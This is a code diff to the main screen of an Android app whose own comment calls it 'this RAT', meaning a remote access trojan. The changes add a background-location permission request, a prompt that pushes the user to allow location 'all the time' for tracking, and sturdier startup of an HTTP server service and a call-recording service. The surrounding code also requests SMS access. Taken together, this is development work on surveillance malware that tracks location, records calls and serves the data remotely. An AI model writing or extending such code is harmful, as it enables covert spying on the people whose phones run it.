@@ -10,6 +10,7 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.os.PowerManager;
 import android.provider.Settings;
+import android.util.Log;
 import android.animation.ArgbEvaluator;
 import android.animation.ObjectAnimator;
 import android.animation.ValueAnimator;
@@ -178,6 +179,19 @@ public class MainActivity extends AppCompatActivity {
             permissionsNeeded.add(Manifest.permission.ACCESS_COARSE_LOCATION);
         }
 
+        // Background location for Android 10+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (ContextCompat.checkSelfPermission(this,
+                    Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                // Note: On Android 11+, this should ideally be requested AFTER fine/coarse are granted.
+                // For simplicity in this RAT, we add it to the initial list if on Android 10.
+                // On Android 11+, we might need a separate dialog or just hope the user grants it.
+                if (Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
+                    permissionsNeeded.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
+                }
+            }
+        }
+
         // SMS permissions
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
@@ -263,6 +277,21 @@ public class MainActivity extends AppCompatActivity {
             @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
+            // Check if foreground location was just granted
+            boolean fineGranted = false;
+            boolean coarseGranted = false;
+            for (int i = 0; i < permissions.length; i++) {
+                if (permissions[i].equals(Manifest.permission.ACCESS_FINE_LOCATION) && grantResults[i] == PackageManager.PERMISSION_GRANTED) fineGranted = true;
+                if (permissions[i].equals(Manifest.permission.ACCESS_COARSE_LOCATION) && grantResults[i] == PackageManager.PERMISSION_GRANTED) coarseGranted = true;
+            }
+
+            if ((fineGranted || coarseGranted) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                // Request background location separately for Android 11+
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                    Toast.makeText(this, "Please select 'Allow all the time' for background tracking", Toast.LENGTH_LONG).show();
+                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 1004);
+                }
+            }
             updateUI();
         }
     }
@@ -276,6 +305,10 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void startServer() {
+        // Immediate UI feedback
+        btnStartStop.setEnabled(false);
+        tvStatus.setText("🟡 INITIALIZING...");
+        
         Intent serviceIntent = new Intent(this, HttpServerService.class);
         serviceIntent.setAction("START");
 
@@ -288,23 +321,35 @@ public class MainActivity extends AppCompatActivity {
         // Start CallRecordService for call detection and recording
         Intent callServiceIntent = new Intent(this, CallRecordService.class);
         callServiceIntent.setAction("START_SERVICE");
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(callServiceIntent);
-        } else {
-            startService(callServiceIntent);
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(callServiceIntent);
+            } else {
+                startService(callServiceIntent);
+            }
+        } catch (Exception e) {
+            Log.e("MainActivity", "Error starting CallRecordService: " + e.getMessage());
         }
 
-        isServerRunning = true;
-        updateUI();
+        // Re-enable and update after short delay to allow service to bind/start
+        btnStartStop.postDelayed(() -> {
+            btnStartStop.setEnabled(true);
+            updateUI();
+        }, 1500);
     }
 
     private void stopServer() {
+        btnStartStop.setEnabled(false);
+        tvStatus.setText("🟡 TERMINATING...");
+
         Intent serviceIntent = new Intent(this, HttpServerService.class);
         serviceIntent.setAction("STOP");
         startService(serviceIntent);
 
-        isServerRunning = false;
-        updateUI();
+        btnStartStop.postDelayed(() -> {
+            btnStartStop.setEnabled(true);
+            updateUI();
+        }, 1500);
     }
 
     private boolean isServerRunning() {
